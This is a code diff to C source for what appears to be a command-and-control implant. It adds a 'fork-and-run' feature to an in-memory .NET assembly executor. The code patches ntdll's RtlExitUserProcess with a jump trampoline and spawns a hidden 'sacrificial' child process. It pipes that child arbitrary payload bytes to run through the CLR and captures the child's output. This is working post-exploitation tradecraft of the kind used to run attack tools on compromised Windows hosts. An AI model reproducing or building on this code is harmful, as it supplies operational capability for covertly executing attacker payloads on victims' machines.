@@ -228,9 +228,14 @@ static void WINAPI ep_stub(UINT code) { ExitThread((DWORD)code); }
 
 static void install_exit_hook(void) {
     if (InterlockedCompareExchange(&g_ep_hooked, 1, 0) != 0) return;
-    HMODULE k32 = GetModuleHandleA("kernel32.dll");
-    if (!k32) return;
-    g_ep_addr = (void*)GetProcAddress(k32, "ExitProcess");
+    /* Patch ntdll!RtlExitUserProcess — the CLR calls this directly */
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (ntdll) g_ep_addr = (void*)GetProcAddress(ntdll, "RtlExitUserProcess");
+    if (!g_ep_addr) {
+        HMODULE k32 = GetModuleHandleA("kernel32.dll");
+        if (!k32) return;
+        g_ep_addr = (void*)GetProcAddress(k32, "ExitProcess");
+    }
     if (!g_ep_addr) return;
     void *stub = (void*)ep_stub;
     // MOV RAX, stub_addr (10 bytes) + JMP RAX (2 bytes) = 12 bytes
@@ -275,7 +280,7 @@ static DWORD WINAPI invoke_thread(LPVOID param) {
 
 // ── Main entry point ──────────────────────────────────────────────────────────
 
-char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args) {
+char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args, int child_mode) {
     if (!asm_bytes || asm_len < 2) return _strdup("dotnet_exec: empty payload");
     if (!load_oleaut32()) return _strdup("dotnet_exec: oleaut32.dll load failed");
 
@@ -372,36 +377,62 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args) {
     SAFEARRAY *saParams = args_to_param_sa(args ? args : "");
     if (!saParams) saParams = g_saCreateVector(VT_VARIANT, 0, 0);
 
-    // ── Redirect stdout to temp file ─────────────────────────────────────────
+    // ── Redirect stdout: temp file (normal) or use inherited pipe (child) ────────
     WCHAR tmpPath[MAX_PATH] = {0};
-    HANDLE origOut, origErr;
-    int origFd1, origFd2;
-    HANDLE fhTmp = redirect_stdout(tmpPath, &origOut, &origErr, &origFd1, &origFd2);
+    HANDLE origOut = INVALID_HANDLE_VALUE, origErr = INVALID_HANDLE_VALUE;
+    int origFd1 = -1, origFd2 = -1;
+    HANDLE fhTmp = INVALID_HANDLE_VALUE;
 
-    // Re-apply SetStdHandle immediately before Invoke — CLR::Start may reset it
-    if (fhTmp != INVALID_HANDLE_VALUE) {
-        SetStdHandle(STD_OUTPUT_HANDLE, fhTmp);
-        SetStdHandle(STD_ERROR_HANDLE,  fhTmp);
+    if (child_mode) {
+        // Stdout is already the pipe; redirect stderr to it too.
+        fhTmp = GetStdHandle(STD_OUTPUT_HANDLE);
+        SetStdHandle(STD_ERROR_HANDLE, fhTmp);
+        HMODULE hCRT = LoadLibraryA("ucrtbase.dll");
+        if (!hCRT) hCRT = LoadLibraryA("msvcrt.dll");
+        if (hCRT) {
+            pfnOSFH pOSFH  = (pfnOSFH) GetProcAddress(hCRT, "_open_osfhandle");
+            pfnDup2 pDup2  = (pfnDup2) GetProcAddress(hCRT, "_dup2");
+            pfnClose pClose= (pfnClose)GetProcAddress(hCRT, "_close");
+            if (pOSFH && pDup2 && pClose) {
+                HANDLE fhDup = INVALID_HANDLE_VALUE;
+                DuplicateHandle(GetCurrentProcess(), fhTmp,
+                                GetCurrentProcess(), &fhDup, 0, FALSE, DUPLICATE_SAME_ACCESS);
+                if (fhDup != INVALID_HANDLE_VALUE) {
+                    int fd = pOSFH((intptr_t)fhDup, 0x8001);
+                    if (fd >= 0) { pDup2(fd, 2); pClose(fd); }
+                }
+            }
+        }
+    } else {
+        fhTmp = redirect_stdout(tmpPath, &origOut, &origErr, &origFd1, &origFd2);
+        if (fhTmp != INVALID_HANDLE_VALUE) {
+            SetStdHandle(STD_OUTPUT_HANDLE, fhTmp);
+            SetStdHandle(STD_ERROR_HANDLE,  fhTmp);
+        }
     }
 
-    // ── Invoke_3 in a separate thread so Environment.Exit() only kills the
-    //    CLR thread (our ExitProcess hook redirects to ExitThread). ────────────
+    // ── Invoke_3 in a thread (ExitThread hook only needed in normal mode) ────────
     InvokeWork work = { pEP, saParams, S_OK };
-    install_exit_hook();
+    if (!child_mode) install_exit_hook();
     HANDLE ht = CreateThread(NULL, 0, invoke_thread, &work, 0, NULL);
     if (ht) {
-        WaitForSingleObject(ht, 60000); // 60s timeout
+        WaitForSingleObject(ht, 60000);
         CloseHandle(ht);
     } else {
-        // Thread creation failed — run inline (risk of process exit on ExitProcess)
         typedef HRESULT (WINAPI *pfnInv3)(void*, OleVar16*, SAFEARRAY*, OleVar16*);
         OleVar16 objVar, retVar;
         memset(&objVar, 0, sizeof(objVar));
         memset(&retVar, 0, sizeof(retVar));
         work.hr = ((pfnInv3*)VTBL(pEP))[37](pEP, &objVar, saParams, &retVar);
     }
-    remove_exit_hook();
+    if (!child_mode) remove_exit_hook();
     hr = work.hr;
+
+    if (child_mode) {
+        FlushFileBuffers(fhTmp);
+        ExitProcess(0);
+        return NULL; // unreachable
+    }
 
     // ── Restore stdout ───────────────────────────────────────────────────────
     restore_stdout(origOut, origErr, origFd1, origFd2);
@@ -415,7 +446,7 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args) {
 
     if (!output || !output[0]) {
         free(output);
-        if (hr == (HRESULT)0x80131604) // COR_E_TARGETINVOCATIONEXCEPTION
+        if (hr == (HRESULT)0x80131604)
             return _strdup("[!] assembly threw an exception");
         if (FAILED(hr)) {
             char buf[64]; snprintf(buf,sizeof(buf),"[!] Invoke_3 hr=0x%08lX",(long)hr);
@@ -424,4 +455,192 @@ char* dotnet_exec(const uint8_t *asm_bytes, size_t asm_len, const char *args) {
         return _strdup("(no output captured)");
     }
     return output;
+}
+
+// ── Fork-and-run: spawn a sacrificial child process to host the CLR ───────────
+
+static void fork_write_all(HANDLE h, const void *data, DWORD n) {
+    DWORD off = 0, wr = 0;
+    while (off < n) {
+        if (!WriteFile(h, (const char*)data + off, n - off, &wr, NULL) || wr == 0) break;
+        off += wr;
+    }
+}
+
+static void fork_write_le32(HANDLE h, DWORD v) {
+    BYTE b[4] = { (BYTE)(v), (BYTE)(v>>8), (BYTE)(v>>16), (BYTE)(v>>24) };
+    fork_write_all(h, b, 4);
+}
+
+typedef struct {
+    HANDLE         h;
+    const uint8_t *asm_bytes;
+    size_t         asm_len;
+    const char    *args;
+} ForkWriteWork;
+
+static DWORD WINAPI fork_write_thread(LPVOID p) {
+    ForkWriteWork *w = (ForkWriteWork*)p;
+    size_t args_len = w->args ? strlen(w->args) : 0;
+    fork_write_le32(w->h, (DWORD)args_len);
+    if (args_len > 0) fork_write_all(w->h, w->args, (DWORD)args_len);
+    fork_write_le32(w->h, (DWORD)w->asm_len);
+    if (w->asm_len > 0) fork_write_all(w->h, w->asm_bytes, (DWORD)w->asm_len);
+    CloseHandle(w->h);
+    free(w);
+    return 0;
+}
+
+char* fork_run_assembly(const uint8_t *asm_bytes, size_t asm_len, const char *args) {
+    WCHAR exe[MAX_PATH+1] = {0};
+    if (!GetModuleFileNameW(NULL, exe, MAX_PATH))
+        return dotnet_exec(asm_bytes, asm_len, args, 0);
+
+    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+    HANDLE asm_rd, asm_wr, out_rd, out_wr;
+
+    if (!CreatePipe(&asm_rd, &asm_wr, &sa, 0))
+        return dotnet_exec(asm_bytes, asm_len, args, 0);
+    SetHandleInformation(asm_wr, HANDLE_FLAG_INHERIT, 0);
+
+    if (!CreatePipe(&out_rd, &out_wr, &sa, 0)) {
+        CloseHandle(asm_rd); CloseHandle(asm_wr);
+        return dotnet_exec(asm_bytes, asm_len, args, 0);
+    }
+    SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);
+
+    SetEnvironmentVariableA("__ENDGAME_CLR_CHILD", "1");
+
+    STARTUPINFOW si = {0};
+    si.cb = sizeof(STARTUPINFOW);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = 0;
+    si.hStdInput = asm_rd; si.hStdOutput = out_wr; si.hStdError = out_wr;
+
+    PROCESS_INFORMATION pi = {0};
+    BOOL ok = CreateProcessW(exe, NULL, NULL, NULL, TRUE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    SetEnvironmentVariableA("__ENDGAME_CLR_CHILD", NULL);
+    CloseHandle(asm_rd); CloseHandle(out_wr);
+
+    if (!ok) {
+        CloseHandle(asm_wr); CloseHandle(out_rd);
+        return dotnet_exec(asm_bytes, asm_len, args, 0);
+    }
+
+    ForkWriteWork *fw = (ForkWriteWork*)malloc(sizeof(ForkWriteWork));
+    if (fw) {
+        fw->h = asm_wr; fw->asm_bytes = asm_bytes;
+        fw->asm_len = asm_len; fw->args = args;
+        HANDLE wt = CreateThread(NULL, 0, fork_write_thread, fw, 0, NULL);
+        if (wt) CloseHandle(wt);
+        else { CloseHandle(asm_wr); free(fw); }
+    } else {
+        CloseHandle(asm_wr);
+    }
+
+    char  *output  = NULL;
+    size_t out_len = 0, out_cap = 0;
+    BYTE   buf[8192];
+    DWORD  deadline = GetTickCount() + 60000;
+
+    while (GetTickCount() < deadline) {
+        DWORD avail = 0;
+        if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL)) break;
+        if (avail > 0) {
+            DWORD nr = 0;
+            ReadFile(out_rd, buf, min(avail, (DWORD)sizeof(buf)), &nr, NULL);
+            if (nr > 0) {
+                if (out_len + nr >= out_cap) {
+                    out_cap = out_len + nr + 4096;
+                    char *tmp = (char*)realloc(output, out_cap + 1);
+                    if (!tmp) break;
+                    output = tmp;
+                }
+                memcpy(output + out_len, buf, nr);
+                out_len += nr;
+            }
+        } else {
+            if (WaitForSingleObject(pi.hProcess, 50) != WAIT_TIMEOUT) {
+                while (1) {
+                    avail = 0;
+                    if (!PeekNamedPipe(out_rd, NULL, 0, NULL, &avail, NULL) || avail == 0) break;
+                    DWORD nr = 0;
+                    ReadFile(out_rd, buf, min(avail, (DWORD)sizeof(buf)), &nr, NULL);
+                    if (nr == 0) break;
+                    if (out_len + nr >= out_cap) {
+                        out_cap = out_len + nr + 4096;
+                        char *tmp = (char*)realloc(output, out_cap + 1);
+                        if (!tmp) break;
+                        output = tmp;
+                    }
+                    memcpy(output + out_len, buf, nr);
+                    out_len += nr;
+                }
+                break;
+            }
+        }
+    }
+
+    CloseHandle(out_rd);
+    if (GetTickCount() >= deadline) {
+        TerminateProcess(pi.hProcess, 1);
+        if (out_len == 0) {
+            free(output);
+            WaitForSingleObject(pi.hProcess, 5000);
+            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+            return _strdup("[!] fork-and-run timeout (60s)");
+        }
+    }
+    WaitForSingleObject(pi.hProcess, 5000);
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+
+    if (!output || out_len == 0) { free(output); return _strdup("(no output from child)"); }
+    output[out_len] = '\0';
+    return output;
+}
+
+// ── Child entry: read protocol from stdin, run CLR via pipe, exit ─────────────
+
+void clr_child_run(void) {
+    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
+    BYTE   hdr[4];
+    DWORD  rd, off;
+
+    off = 0;
+    while (off < 4) {
+        rd = 0;
+        if (!ReadFile(hIn, hdr + off, 4 - off, &rd, NULL) || rd == 0) ExitProcess(1);
+        off += rd;
+    }
+    DWORD args_len = (DWORD)hdr[0] | ((DWORD)hdr[1]<<8) | ((DWORD)hdr[2]<<16) | ((DWORD)hdr[3]<<24);
+
+    char *args_str = (char*)calloc(args_len + 1, 1);
+    if (!args_str) ExitProcess(1);
+    off = 0;
+    while (off < args_len) {
+        rd = 0;
+        if (!ReadFile(hIn, args_str + off, args_len - off, &rd, NULL) || rd == 0) ExitProcess(1);
+        off += rd;
+    }
+
+    off = 0;
+    while (off < 4) {
+        rd = 0;
+        if (!ReadFile(hIn, hdr + off, 4 - off, &rd, NULL) || rd == 0) ExitProcess(1);
+        off += rd;
+    }
+    DWORD asm_len = (DWORD)hdr[0] | ((DWORD)hdr[1]<<8) | ((DWORD)hdr[2]<<16) | ((DWORD)hdr[3]<<24);
+
+    uint8_t *asm_bytes = (uint8_t*)malloc(asm_len);
+    if (!asm_bytes) ExitProcess(1);
+    off = 0;
+    while (off < asm_len) {
+        rd = 0;
+        if (!ReadFile(hIn, asm_bytes + off, asm_len - off, &rd, NULL) || rd == 0) ExitProcess(1);
+        off += rd;
+    }
+
+    dotnet_exec(asm_bytes, asm_len, args_str, 1); // calls ExitProcess(0) on completion
+    ExitProcess(0);
 }
